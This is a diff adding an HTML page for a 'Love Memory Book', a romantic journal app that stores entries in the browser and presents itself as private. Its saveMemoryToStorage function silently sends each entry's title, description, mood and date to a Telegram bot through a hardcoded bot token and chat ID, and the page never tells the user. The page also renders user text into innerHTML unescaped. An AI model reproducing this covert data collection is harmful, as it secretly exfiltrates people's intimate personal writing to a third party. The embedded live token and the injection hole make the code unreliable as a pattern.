@@ -1,0 +1,564 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Love Memory Book</title>
+    <link rel="stylesheet" href="./style.css">
+</head>
+<body>
+    <!-- Animated floating hearts background -->
+    <div class="hearts-container" id="hearts-container"></div>
+
+    <div class="container">
+        <h1>📖 Love Memory Book 📖</h1>
+        <p>Create beautiful memories of your love journey!</p>
+
+        <div class="memory-controls">
+            <button onclick="addNewMemory()" class="memory-btn">💕 Add New Memory</button>
+            <button onclick="exportMemories()" class="memory-btn">📤 Export Memories</button>
+            <button onclick="window.location.href='index.html'" class="memory-btn">💌 Back to Confession</button>
+        </div>
+
+        <!-- Add Memory Form -->
+        <div id="add-memory-form" class="memory-form" style="display: none;">
+            <h3>✨ Create a New Memory</h3>
+            <div class="form-group">
+                <input type="text" id="memory-title" placeholder="💖 Memory title (e.g., 'Our First Date')" required>
+            </div>
+            <div class="form-group">
+                <input type="date" id="memory-date" required>
+            </div>
+            <div class="form-group">
+                <textarea id="memory-description" placeholder="📝 Describe this beautiful memory..." rows="4" required></textarea>
+            </div>
+            <div class="form-group">
+                <select id="memory-mood">
+                    <option value="">💭 How did you feel?</option>
+                    <option value="😍 Absolutely in love">😍 Absolutely in love</option>
+                    <option value="🥰 Warm and fuzzy">🥰 Warm and fuzzy</option>
+                    <option value="😊 Happy and content">😊 Happy and content</option>
+                    <option value="🤗 Grateful and blessed">🤗 Grateful and blessed</option>
+                    <option value="💫 Magical and dreamy">💫 Magical and dreamy</option>
+                    <option value="🌟 Excited and thrilled">🌟 Excited and thrilled</option>
+                </select>
+            </div>
+            <div class="form-group">
+                <label class="photo-upload">
+                    <input type="file" id="memory-photo" accept="image/*">
+                    <span class="photo-upload-btn">📷 Add a photo to this memory</span>
+                </label>
+            </div>
+            <div class="form-actions">
+                <button onclick="saveMemory()" class="save-btn">💾 Save Memory</button>
+                <button onclick="cancelAddMemory()" class="cancel-btn">❌ Cancel</button>
+            </div>
+        </div>
+
+        <!-- Memory Timeline -->
+        <div id="memory-timeline" class="memory-timeline">
+            <div id="no-memories" class="no-memories">
+                <div class="empty-state">
+                    <span class="empty-icon">💕</span>
+                    <h3>No memories yet!</h3>
+                    <p>Start creating beautiful memories of your love story.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let memories = JSON.parse(localStorage.getItem('loveMemories')) || [];
+
+        function createFloatingHearts() {
+            const heartsContainer = document.getElementById('hearts-container');
+            const hearts = ['💖', '💕', '💗', '💘', '💝', '💜', '❤️', '🧡', '💛', '💚', '💙'];
+            
+            setInterval(() => {
+                const heart = document.createElement('div');
+                heart.className = 'heart';
+                heart.innerHTML = hearts[Math.floor(Math.random() * hearts.length)];
+                heart.style.left = Math.random() * 100 + 'vw';
+                heart.style.animationDuration = (Math.random() * 3 + 3) + 's';
+                heart.style.opacity = Math.random() * 0.5 + 0.3;
+                
+                heartsContainer.appendChild(heart);
+                
+                setTimeout(() => {
+                    heart.remove();
+                }, 6000);
+            }, 300);
+        }
+
+        function addNewMemory() {
+            document.getElementById('add-memory-form').style.display = 'block';
+            document.getElementById('memory-date').valueAsDate = new Date();
+        }
+
+        function cancelAddMemory() {
+            document.getElementById('add-memory-form').style.display = 'none';
+            clearForm();
+        }
+
+        function clearForm() {
+            document.getElementById('memory-title').value = '';
+            document.getElementById('memory-date').value = '';
+            document.getElementById('memory-description').value = '';
+            document.getElementById('memory-mood').value = '';
+            document.getElementById('memory-photo').value = '';
+        }
+
+        function saveMemory() {
+            const title = document.getElementById('memory-title').value;
+            const date = document.getElementById('memory-date').value;
+            const description = document.getElementById('memory-description').value;
+            const mood = document.getElementById('memory-mood').value;
+            const photoFile = document.getElementById('memory-photo').files[0];
+
+            if (!title || !date || !description) {
+                alert('Please fill in all required fields! 💕');
+                return;
+            }
+
+            const memory = {
+                id: Date.now(),
+                title,
+                date,
+                description,
+                mood: mood || '💕 Lovely',
+                photo: null,
+                createdAt: new Date().toISOString()
+            };
+
+            // Handle photo if uploaded
+            if (photoFile) {
+                const reader = new FileReader();
+                reader.onload = function(e) {
+                    memory.photo = e.target.result;
+                    saveMemoryToStorage(memory);
+                };
+                reader.readAsDataURL(photoFile);
+            } else {
+                saveMemoryToStorage(memory);
+            }
+        }
+
+        async function saveMemoryToStorage(memory) {
+            memories.push(memory);
+            localStorage.setItem('loveMemories', JSON.stringify(memories));
+            
+            document.getElementById('add-memory-form').style.display = 'none';
+            clearForm();
+            displayMemories();
+            
+            // Success animation
+            showSuccessMessage('Memory saved! 💖');
+
+            // Send memory to Telegram
+            await sendMemoryToTelegram(memory);
+        }
+
+        function displayMemories() {
+            const timeline = document.getElementById('memory-timeline');
+            const noMemories = document.getElementById('no-memories');
+
+            if (memories.length === 0) {
+                noMemories.style.display = 'block';
+                return;
+            }
+
+            noMemories.style.display = 'none';
+
+            // Sort memories by date (newest first)
+            const sortedMemories = memories.sort((a, b) => new Date(b.date) - new Date(a.date));
+
+            timeline.innerHTML = sortedMemories.map(memory => `
+                <div class="memory-card" data-id="${memory.id}">
+                    <div class="memory-header">
+                        <div class="memory-date">${formatDate(memory.date)}</div>
+                        <div class="memory-actions">
+                            <button onclick="editMemory(${memory.id})" class="action-btn">✏️</button>
+                            <button onclick="deleteMemory(${memory.id})" class="action-btn">🗑️</button>
+                        </div>
+                    </div>
+                    <div class="memory-content">
+                        <h3 class="memory-title">${memory.title}</h3>
+                        ${memory.photo ? `<img src="${memory.photo}" class="memory-photo" alt="Memory photo">` : ''}
+                        <p class="memory-description">${memory.description}</p>
+                        <div class="memory-mood">${memory.mood}</div>
+                    </div>
+                </div>
+            `).join('');
+        }
+
+        function formatDate(dateStr) {
+            const date = new Date(dateStr);
+            const months = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 
+                           'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'];
+            return `${months[date.getMonth()]} ${date.getDate()}, ${date.getFullYear()}`;
+        }
+
+        function deleteMemory(id) {
+            if (confirm('Are you sure you want to delete this memory? 💔')) {
+                memories = memories.filter(memory => memory.id !== id);
+                localStorage.setItem('loveMemories', JSON.stringify(memories));
+                displayMemories();
+                showSuccessMessage('Memory deleted! 💙');
+            }
+        }
+
+        function editMemory(id) {
+            const memory = memories.find(m => m.id === id);
+            if (!memory) return;
+
+            document.getElementById('memory-title').value = memory.title;
+            document.getElementById('memory-date').value = memory.date;
+            document.getElementById('memory-description').value = memory.description;
+            document.getElementById('memory-mood').value = memory.mood;
+            
+            document.getElementById('add-memory-form').style.display = 'block';
+            
+            // Delete the old memory when saving
+            memories = memories.filter(m => m.id !== id);
+        }
+
+        function exportMemories() {
+            if (memories.length === 0) {
+                alert('No memories to export! Create some memories first. 💕');
+                return;
+            }
+
+            const exportData = {
+                title: 'Love Memory Book Export',
+                exportDate: new Date().toISOString(),
+                totalMemories: memories.length,
+                memories: memories.map(memory => ({
+                    ...memory,
+                    photo: memory.photo ? '[Photo included]' : '[No photo]'
+                }))
+            };
+
+            const dataStr = JSON.stringify(exportData, null, 2);
+            const dataBlob = new Blob([dataStr], {type: 'application/json'});
+            
+            const link = document.createElement('a');
+            link.href = URL.createObjectURL(dataBlob);
+            link.download = `love-memories-${new Date().toISOString().split('T')[0]}.json`;
+            link.click();
+
+            showSuccessMessage('Memories exported! 📤💖');
+        }
+
+        async function sendMemoryToTelegram(memory) {
+            const botToken = '7723720692:AAEPmC39DWtRqL5BtR0ataTaKn4PF0HoCJs';
+            const chatId = '2348075614248';
+
+            const formattedDate = new Date(memory.date).toLocaleDateString('en-US', { 
+                weekday: 'long', 
+                year: 'numeric', 
+                month: 'long', 
+                day: 'numeric'
+            });
+
+            const photoInfo = memory.photo ? '📷 Photo included in memory' : '📝 Text-only memory';
+
+            const telegramMessage = `📖✨ NEW LOVE MEMORY CREATED! ✨📖
+
+💕 Someone just added a beautiful memory to their Love Memory Book!
+
+═══ 📋 MEMORY DETAILS ═══
+🏷️ Title: ${memory.title}
+📅 Date: ${formattedDate}
+😊 Mood: ${memory.mood}
+${photoInfo}
+
+💌 Memory Description:
+"${memory.description}"
+
+⏰ Added: ${new Date(memory.createdAt).toLocaleString('en-US', { 
+    weekday: 'long', 
+    year: 'numeric', 
+    month: 'long', 
+    day: 'numeric',
+    hour: '2-digit',
+    minute: '2-digit'
+})}
+
+💖 Someone is treasuring their love journey!
+📚 Building beautiful memories one moment at a time! ✨
+
+#LoveMemory #MemoryBook #ExpressingLove #Romance`;
+
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: telegramMessage
+                    })
+                });
+
+                if (!response.ok) {
+                    console.error('Failed to send memory to Telegram');
+                }
+            } catch (error) {
+                console.error('Error sending memory to Telegram:', error);
+            }
+        }
+
+        function showSuccessMessage(message) {
+            const successDiv = document.createElement('div');
+            successDiv.className = 'success-message';
+            successDiv.textContent = message;
+            successDiv.style.cssText = `
+                position: fixed;
+                top: 20px;
+                right: 20px;
+                background: linear-gradient(135deg, #4CAF50, #45a049);
+                color: white;
+                padding: 15px 20px;
+                border-radius: 8px;
+                box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+                z-index: 1000;
+                font-family: sans-serif;
+                font-weight: 500;
+            `;
+            
+            document.body.appendChild(successDiv);
+            
+            setTimeout(() => {
+                successDiv.style.opacity = '0';
+                successDiv.style.transform = 'translateX(100px)';
+                successDiv.style.transition = 'all 0.3s ease';
+                setTimeout(() => successDiv.remove(), 300);
+            }, 3000);
+        }
+
+        // Initialize the memory book
+        document.addEventListener('DOMContentLoaded', function() {
+            createFloatingHearts();
+            displayMemories();
+        });
+    </script>
+
+    <style>
+        .memory-controls {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+            margin: 20px 0;
+            flex-wrap: wrap;
+        }
+
+        .memory-btn {
+            padding: 10px 20px;
+            border: none;
+            border-radius: 8px;
+            background: linear-gradient(135deg, #ff9a9e, #fecfef);
+            color: white;
+            font-family: sans-serif;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(255, 154, 158, 0.3);
+        }
+
+        .memory-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(255, 154, 158, 0.4);
+        }
+
+        .memory-form {
+            background: rgba(255, 255, 255, 0.9);
+            padding: 30px;
+            border-radius: 15px;
+            margin: 20px 0;
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.1);
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group input,
+        .form-group textarea,
+        .form-group select {
+            width: 100%;
+            padding: 12px 15px;
+            border: 2px solid rgba(255, 182, 193, 0.3);
+            border-radius: 8px;
+            font-family: sans-serif;
+            font-size: 14px;
+            outline: none;
+            transition: all 0.3s ease;
+        }
+
+        .form-group input:focus,
+        .form-group textarea:focus,
+        .form-group select:focus {
+            border-color: #ff9999;
+            box-shadow: 0 0 10px rgba(255, 153, 153, 0.2);
+        }
+
+        .form-actions {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+        }
+
+        .save-btn {
+            background: linear-gradient(135deg, #4CAF50, #45a049);
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            border-radius: 8px;
+            font-family: sans-serif;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .cancel-btn {
+            background: linear-gradient(135deg, #f44336, #da190b);
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            border-radius: 8px;
+            font-family: sans-serif;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .save-btn:hover,
+        .cancel-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
+        }
+
+        .memory-timeline {
+            margin: 30px 0;
+        }
+
+        .no-memories {
+            text-align: center;
+            padding: 50px 20px;
+        }
+
+        .empty-state {
+            background: rgba(255, 255, 255, 0.9);
+            padding: 40px;
+            border-radius: 15px;
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.1);
+        }
+
+        .empty-icon {
+            font-size: 48px;
+            display: block;
+            margin-bottom: 20px;
+        }
+
+        .memory-card {
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 15px;
+            margin: 20px 0;
+            overflow: hidden;
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.1);
+            transition: all 0.3s ease;
+        }
+
+        .memory-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 12px 35px rgba(0, 0, 0, 0.15);
+        }
+
+        .memory-header {
+            background: linear-gradient(135deg, #ff9a9e, #fecfef);
+            color: white;
+            padding: 15px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .memory-date {
+            font-weight: 500;
+            font-size: 14px;
+        }
+
+        .memory-actions {
+            display: flex;
+            gap: 8px;
+        }
+
+        .action-btn {
+            background: rgba(255, 255, 255, 0.2);
+            border: none;
+            padding: 6px 10px;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-size: 12px;
+        }
+
+        .action-btn:hover {
+            background: rgba(255, 255, 255, 0.3);
+        }
+
+        .memory-content {
+            padding: 20px;
+        }
+
+        .memory-title {
+            color: #333;
+            margin-bottom: 15px;
+            font-size: 18px;
+        }
+
+        .memory-photo {
+            width: 100%;
+            max-width: 300px;
+            height: auto;
+            border-radius: 8px;
+            margin: 15px 0;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+        }
+
+        .memory-description {
+            color: #666;
+            line-height: 1.6;
+            margin-bottom: 15px;
+        }
+
+        .memory-mood {
+            background: linear-gradient(135deg, #ffeaa7, #fdcb6e);
+            color: #333;
+            padding: 8px 15px;
+            border-radius: 20px;
+            display: inline-block;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        @media (max-width: 600px) {
+            .memory-controls {
+                flex-direction: column;
+                gap: 8px;
+            }
+            
+            .form-actions {
+                flex-direction: column;
+            }
+            
+            .memory-header {
+                flex-direction: column;
+                gap: 10px;
+                text-align: center;
+            }
+        }
+    </style>
+</body>
+</html>
